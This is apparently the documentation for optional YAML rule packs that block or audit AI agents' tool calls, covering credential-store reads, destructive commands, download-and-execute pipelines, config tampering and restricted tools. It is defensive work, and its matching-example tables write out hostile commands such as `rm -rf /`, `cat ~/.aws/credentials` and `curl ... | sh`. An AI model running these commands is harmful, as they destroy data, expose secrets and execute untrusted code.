# Optional runtime rule packs

These five packs add **25 optional rules** for runtime agent hooks. They are
original, reviewable examples for Claude, Codex, Hermes, and Gemini CLI callbacks.
The [default policy](../examples/rules/default.yaml) contains five additional
rules. No pack is automatically enabled.

Every rule scopes matching to named tools. Direct file rules also require a
recognized native path field; content rules inspect callback text as a heuristic.
They do not block a prompt merely because it discusses a command when no matching
tool name is present. Tool names and callback data are not authenticated proof
that a particular file access or command occurred.

Gemini CLI support is available in v0.2.0; the v0.1.0 downloads retain their
original three-adapter policies and evidence. Gemini's
`read_file`, `write_file`, `replace`, and `run_shell_command` names are included
in relevant selectors. Only `BeforeTool` can enforce a denial; `AfterTool` and
other registered events remain observational. Direct path rules cover native
`file_path` arguments of those file tools; `read_many_files` include globs are
not interpreted or expanded and are outside that coverage. Antigravity is not
supported.

## Choose and combine

AI Lens loads **one rules file** for a state directory. Selecting an optional
pack replaces the previously selected file; it does not append to the default.
There is no `include`, pack loader, priority, exclusion, or allow-override feature.

To combine rules, manually copy the desired list entries under one `version: 1`
and one `rules:` key in a new YAML file. Keep IDs unique, retain each entry's
selectors, and stay within 128 rules, 256 KiB of YAML, and 4,096 bytes per regex.
Selectors within a rule combine with AND; any matching block wins over audit.
See [the schema and matching semantics](rules.md).

```sh
agent-lens rules-check --rules examples/rules/credential-stores.yaml
agent-lens --state .agent-lens-lab start --output events.jsonl \
  --rules examples/rules/credential-stores.yaml
```

Review the block entries before activation. Change selected actions to `audit`
in your own policy while tuning legitimate workflows. A block applies only when
a supported pre-tool callback is invoked and its response honored. On post-tool
events, the same match is `would_block`; it cannot undo an action. Audit rules
retain their IDs while allowing the action. These packs do not create an OS
sandbox, enforce network destinations, or protect themselves from the same user.

Commands below illustrate matching only. Do not execute destructive examples as
tests. The repository's synthetic replay harness does not run fixture commands.

## Credential stores

File: [credential-stores.yaml](../examples/rules/credential-stores.yaml).
The direct checks use read/write/edit tool names and case-insensitive path
suffixes. Windows separators are normalized by the engine. The shell fallback
audits literal references because a reference alone does not prove access.

| Rule ID | Action and purpose | Matching example | Nearby miss |
| --- | --- | --- | --- |
| `cred-cloud-stores` | Block direct AWS, Azure, and gcloud auth-store access. | `Read` path `C:\Users\demo\.aws\credentials` | `/work/aws-notes.md` |
| `cred-kube-config` | Block the default Kubernetes client config path. | `Read` path `~/.kube/config` | `~/.kube/config.example` |
| `cred-package-vcs-stores` | Block illustrated package, registry, and Git auth files. | `Read` path `~/.docker/config.json`, `~/.npmrc`, or `~/.pypirc` | `/work/package.json` |
| `cred-ssh-private-keys` | Block default SSH private-key filenames. | `Read` path `~/.ssh/id_ed25519` | `~/.ssh/id_ed25519.pub` |
| `cred-shell-store-references` | Audit literal references to these stores in shell tools. | `Bash` input `cat ~/.aws/credentials` | `cat README.md` |

The cloud rule also names `.aws/config`, Azure `accessTokens.json` and
`msal_token_cache.json`/`.bin`, plus gcloud's application-default JSON and
credential/token databases. The package/VCS rule includes `.git-credentials`,
`.netrc`, `_netrc`, and `gh/hosts.yml`/`.yaml`.

Legitimate login, profile inspection, registry setup, and Kubernetes workflows
can match. Configuration files may contain helper references rather than secrets;
this is a path policy, not a contents verdict. Custom credential locations,
environment variables, keychains, renamed keys, indirect shell reads, and unknown
tool/path fields can evade it. The shell rule can audit a harmless `echo` of a
filename. It neither reads those files itself nor checks their actual contents.

## Destructive operations

File: [destructive-operations.yaml](../examples/rules/destructive-operations.yaml).
All six rules require a shell-tool name and narrow, literal command forms.

| Rule ID | Action and purpose | Matching example | Nearby miss |
| --- | --- | --- | --- |
| `destructive-root-delete` | Block common forced recursive deletion of root/home. | `rm -rf /` or `rm -fr ~` | `rm -rf /tmp/build` |
| `destructive-powershell-root-delete` | Block explicit recursive forced removal of a drive root. | `Remove-Item -Recurse -Force C:\*` | `Remove-Item -Recurse -Force C:\work\build` |
| `destructive-git-hard-reset` | Block the literal hard-reset form. | `git reset --hard HEAD~1` | `git reset --soft HEAD~1` |
| `destructive-git-clean-force` | Block force in the first clean option group. | `git clean -fdx` | `git clean -n` |
| `destructive-git-force-push` | Block raw `-f`/`--force` push flags. | `git push --force origin main` | `git push --force-with-lease origin main` |
| `destructive-raw-disk-write` | Block literal `dd` output and `mkfs` targets on illustrated Linux disks. | `dd if=image.img of=/dev/sda` | `dd if=image.img of=image-copy.img` |

Authorized recovery, disposable disk formatting, and intentional history rewrites
still match. A force-clean dry run with `-f` first can also match. The nearby
misses are examples of scope, not endorsements that those commands are safe.
Linux device examples include sd/vd/xvd, NVMe, and mmcblk devices and partitions;
they do not cover every device spelling or Windows disk-management operation.

These are not shell, PowerShell, or Git parsers. Split/reordered flags, aliases,
`git -C DIR`, scripts, interpreters, variable expansion, and longer argument lists
can miss. Root deletion intentionally covers only the illustrated short-option
forms; normal recursive build cleanup is outside that rule. Force-push scanning
allows up to four intervening tokens, and the disk rule bounds its command scan.
Quoted examples or comments within a matching callback can produce false hits.

## Execution and network

File: [execution-and-network.yaml](../examples/rules/execution-and-network.yaml).
Only an explicit download-to-shell pipeline blocks; broader legitimate operations
are audited.

| Rule ID | Action and purpose | Matching example | Nearby miss |
| --- | --- | --- | --- |
| `exec-remote-pipe-shell` | Block an HTTP curl/wget download piped to a named shell. | `curl https://example.invalid/install.sh \| sh` | `curl https://example.invalid/data.txt \| head` |
| `exec-outbound-upload` | Audit illustrated curl upload/body and wget post-file flags. | `curl --upload-file report.txt https://example.invalid/upload` | `curl https://example.invalid/status` |
| `exec-ssh-scp` | Audit SSH, SCP, SFTP, and rsync command names. | `scp report.txt user@example.invalid:/tmp/` | `cp report.txt local-copy.txt` |
| `exec-privileged-command` | Audit sudo/doas/runas and explicit PowerShell RunAs. | `sudo make install` | `make` |
| `exec-permission-changes` | Audit permission/ownership utilities. | `chmod 600 report.txt` | `stat report.txt` |

Installers, publishing, remote development, and restrictive permission fixes are
common legitimate matches. Auditing an upload flag does not prove a connection,
identify its destination, or establish data leakage. rsync can even be local.
The permission rule includes chmod/chown/chgrp, icacls, and Set-Acl; it does not
evaluate whether the requested permission is broader or narrower.

The pipeline rule recognizes curl/wget, literal HTTP(S), and ordinary pipes to
sh/bash/zsh/pwsh/powershell. It misses download-then-execute sequences,
PowerShell web cmdlets, Python/network libraries, encoded commands, substitutions,
and custom executable names. Pipeline and upload scans use bounded 96-character
segments to stay within the engine's regex compilation budget; long URLs/options
can miss. Other command rules also have explicit bounds and simplified option
handling. No rule evaluates package reputation or dependency-install safety.

## Agent configuration integrity

File: [agent-config-integrity.yaml](../examples/rules/agent-config-integrity.yaml).
Direct checks require a write/edit tool and a recognized path field. Ordinary
reads of instructions are not denied by these rules. A separate shell-reference
rule audits paths without guessing whether a shell command writes them.

| Rule ID | Action and purpose | Matching example | Nearby miss |
| --- | --- | --- | --- |
| `integrity-agent-config-write` | Block illustrated agent settings, hook, and plugin writes. | `Write` path `~/.claude/settings.json`, `~/.codex/config.toml`, `~/.hermes/config.yaml`, or `~/.gemini/settings.json` | `Write` path `/work/src/settings.rs` |
| `integrity-instructions-write` | Audit instruction/personality edits. | `Edit` path `AGENTS.md`, `CLAUDE.md`, `SOUL.md`, or `GEMINI.md` | `Edit` path `README.md` |
| `integrity-policy-write` | Block default Lens-state and illustrated policy-file writes. | `Write` path `.agent-lens/config.json` or `examples/rules/custom.yaml` | `Write` path `examples/events/sample.json` |
| `integrity-engine-binary-write` | Block writes to the named Lens host/library files. | `Write` path `agent_lens_engine.dll` | `Write` path `engine-notes.md` |
| `integrity-shell-config-references` | Audit literal configuration/instruction references. | `cat ~/.codex/config.toml` | `cat src/main.rs` |

The settings rule includes Claude local settings and hook directories, Codex
`hooks.json` and hook directories, Hermes hook/plugin directories, and Gemini
`.gemini/settings.json` and hook directories. Instruction
patterns include `AGENTS.override.md` and `.claude/rules/*.md` descendants. Lens
binary names cover Windows, Linux, and macOS. Path patterns are case-insensitive
and accept normalized Windows separators.

Intentional hook installation, policy updates, upgrades, and instruction changes
can match. The rule does not know who authorized a write. A custom state directory,
custom policy filename, another settings location, symlink target, or replacement
through an unhooked process can miss. Embedded patch text does not automatically
become a recognized path field; the shell audit rule also does not cover arbitrary
patch text. These examples are not tamper resistance. Adapt paths to your actual
installation and retain independent OS permissions and agent approvals.

## Restricted named tools

File: [restricted-tools.yaml](../examples/rules/restricted-tools.yaml).
These rules match explicit tool names only; edit the names to match your registry.
They do not perform tool discovery or authenticate an MCP server.

Gemini uses `mcp_server_tool` with single separators, for example
`mcp_fetch_fetch`, `mcp_http_post`, and `mcp_playwright_browser_evaluate`. The
optional patterns accept both single- and double-separator forms. The source
aliases below and in fixtures are illustrative; catalog replay translates them
to Gemini native names. Verify the names in your actual callback/registry before
relying on a rule.

| Rule ID | Action and purpose | Matching example | Nearby miss |
| --- | --- | --- | --- |
| `restricted-mcp-network-tools` | Audit illustrated fetch/http/web MCP requests. | `mcp__fetch__fetch` or `mcp__http__post` | `mcp__filesystem__read_file` |
| `restricted-browser-tools` | Audit illustrated browser navigation and interaction. | `mcp__playwright__browser_navigate` | `Read` |
| `restricted-browser-script` | Block the named Playwright page-evaluation/code tools. | `mcp__playwright__browser_evaluate` or `mcp__playwright__browser_run_code` | `mcp__playwright__browser_navigate` |
| `restricted-delegation` | Audit named task/subagent delegation tools. | `Task`, `Agent`, `spawn_agent`, or `delegate_task` | `Read` |

Legitimate browser testing, JavaScript evaluation, web requests, and delegation
can match. This optional pack deliberately denies two named script tools for
operators who prohibit them; it does not judge their script content. Other server
names, tool aliases, shell-launched browsers, alternative network tools, and
unhooked delegation can miss. A broad browser audit can match alongside the
script denial: the block still wins. Audit entries do not grant permission or
override the agent's own approval process.

## Verification and research context

Run `rules-check` after edits or manual merges. The repository's
`python3 scripts/rules_smoke.py` replays each catalog rule's intended hit, nearby
miss, and post-tool behavior through the executable/library with synthetic
Claude, Codex, Hermes, and Gemini CLI inputs (30 rules × 4 adapters × 3 scenarios
= 360 synthetic scenarios). Fixture commands are never executed. That
checks the tested callback forms, not live client registration, all command
variants, or actual network/filesystem effects. Verify your live integration
separately with harmless positive and negative controls.

These recipes use the threat categories and least-privilege guidance in the
[OWASP AI Agent Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html)
and [OWASP LLM06:2025 Excessive Agency](https://genai.owasp.org/llmrisk/llm062025-excessive-agency/).
The exact paths, tool selectors, and command regexes here are project examples,
not policies published or endorsed by OWASP. The official
[Anthropic Sandbox Runtime documentation](https://github.com/anthropic-experimental/sandbox-runtime/blob/main/README.md)
describes separate filesystem/process-tree and network controls; those OS-level
mechanisms are outside AI Lens YAML's capabilities. Sources were reviewed
on October 28, 2026. No third-party detector implementation or rule set was copied.
